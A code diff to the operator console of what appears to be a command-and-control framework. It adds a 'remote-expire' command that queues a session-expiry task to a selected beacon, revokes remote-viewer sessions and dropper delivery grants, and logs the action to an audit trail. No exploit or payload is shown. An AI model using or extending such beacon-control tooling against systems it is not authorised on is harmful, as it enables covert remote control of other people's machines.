@@ -2,6 +2,7 @@ import cmd
 import sys
 import os
 import subprocess
+import time as _time_mod
 from datetime import datetime
 from typing import Optional
 
@@ -821,7 +822,7 @@ class C2Shell(cmd.Cmd):
         if arg == "gui":
             try:
                 from phantom.core.remote_viewer import launch_viewer
-                port, _thread = launch_viewer(self.active_beacon)
+                port, _thread, _tok = launch_viewer(self.active_beacon)
             except Exception as e:
                 notifier.error(f"Viewer failed to start: {e}")
                 return
@@ -883,6 +884,49 @@ class C2Shell(cmd.Cmd):
             pass
         notifier.success(f"Live view stopped ({shown} frame(s) rendered). "
                          "Full-res frames: data/remote/ — 'remote-open' to view.")
+
+    def do_remote_expire(self, arg):
+        """remote-expire <seconds|now> — Set the remote session lifetime (P0-7):
+        the module stops accepting input and streaming when the deadline
+        passes; 'now' revokes the running session immediately. The task is
+        audited in the immutable log."""
+        arg = (arg or "").strip().lower()
+        if not arg:
+            notifier.error("Usage: remote-expire <seconds|now>")
+            return
+        if not self.active_beacon:
+            notifier.error("Select a beacon first (use <beacon_id>).")
+            return
+        if arg == "now":
+            epoch = 0
+        else:
+            try:
+                seconds = int(arg)
+            except ValueError:
+                notifier.error("Seconds must be an integer (or 'now').")
+                return
+            epoch = int(_time_mod.time()) + seconds
+        task_id = c2_state.queue_task(self.active_beacon,
+                                      f"session-expires {epoch}")
+        # Review-3: revoking the session also burns its DELIVERY grant, so the
+        # module cannot simply be re-downloaded through a leaked dropper URL.
+        revoked = 0
+        if epoch == 0:
+            try:
+                revoked = c2_state.revoke_remote_session(
+                    beacon_id=self.active_beacon)
+            except Exception:
+                revoked = 0
+        try:
+            from phantom.utils.audit_log import audit_log
+            audit_log.append("remote_session_expiry", beacon_id=self.active_beacon,
+                             deadline_epoch=epoch, task_id=task_id,
+                             session_tokens_revoked=revoked)
+        except Exception:
+            pass
+        notifier.success(
+            f"Session expiry queued for {self.active_beacon}: "
+            + ("REVOKED NOW" if epoch == 0 else f"deadline epoch {epoch}"))
 
     def do_remote_open(self, arg):
         """remote-open — open the most recent full-resolution remote frame
